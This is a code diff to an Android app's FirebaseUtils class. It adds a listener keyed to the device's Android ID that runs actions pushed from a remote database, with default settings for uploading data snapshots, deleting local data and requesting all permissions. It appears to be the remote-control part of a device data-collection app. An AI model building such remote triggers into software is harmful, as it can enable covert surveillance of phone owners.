@@ -13,9 +13,16 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
+import com.google.gson.JsonObject;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
 import com.vikasyadavnsit.cdc.data.User;
+import com.vikasyadavnsit.cdc.enums.ActionStatus;
+import com.vikasyadavnsit.cdc.enums.ClickActions;
 
+import org.json.JSONObject;
+
+import java.util.Arrays;
+import java.util.HashMap;
 import java.util.Map;
 
 public class FirebaseUtils {
@@ -24,7 +31,7 @@ public class FirebaseUtils {
     public static FirebaseDatabase getDatabase() {
         FirebaseDatabase database = FirebaseDatabase.getInstance(
                 AppConstants.FIREBASE_DATABASE_REGION_URL);
-        database.setPersistenceEnabled(true);
+       // database.setPersistenceEnabled(true);
         return database;
     }
 
@@ -35,12 +42,51 @@ public class FirebaseUtils {
         return reference;
     }
 
-    private String getPath(Context context, String path) {
+    private static String getPath(Context context, String path) {
         return getBasePath(context) + path;
     }
 
     private static String getBasePath(Context context) {
         return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
+    }
+
+    public static void getAppTriggerSettingsData(Context context) {
+        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath(context, "/appSettings/appTriggerSettingsDataMap"));
+        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (!dataSnapshot.exists()) {
+                    // User does not exist, create a new user
+                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap(context));
+                } else {
+                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                // Failed to read value
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap(Context context) {
+        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
+        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
+            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
+                    .enabled(false)
+                    .repeatable(false)
+                    .maxRepetitions(1)
+                    .interval(0)
+                    .actionStatus(ActionStatus.IDLE)
+                    .clickActions(clickAction)
+                    .uploadDataSnapshot(true)
+                    .deleteLocalData(false)
+                    .build();
+            map.put(clickAction.name(), obj);
+        });
+        return map;
     }
 
     public static void checkAndCreateUser(Context context) {
@@ -68,12 +114,12 @@ public class FirebaseUtils {
                 .userDetails(Map.of())
                 .deviceDetails(getDeviceDetails(context))
                 .appSettings(
-                        User.AppSettings
-                                .builder()
+                        User.AppSettings.builder()
                                 .appTriggerSettingsDataMap(
-                                        Map.of("",
-                                                User.AppTriggerSettingsData.builder()
-                                                        .build())
+                                        Map.of("", User.AppTriggerSettingsData.builder()
+                                                .enabled(true)
+                                                .clickActions(ClickActions.REQUEST_ALL_PERMISSION)
+                                                .build())
                                 )
                                 .appSettingsMap(Map.of())
                                 .build()
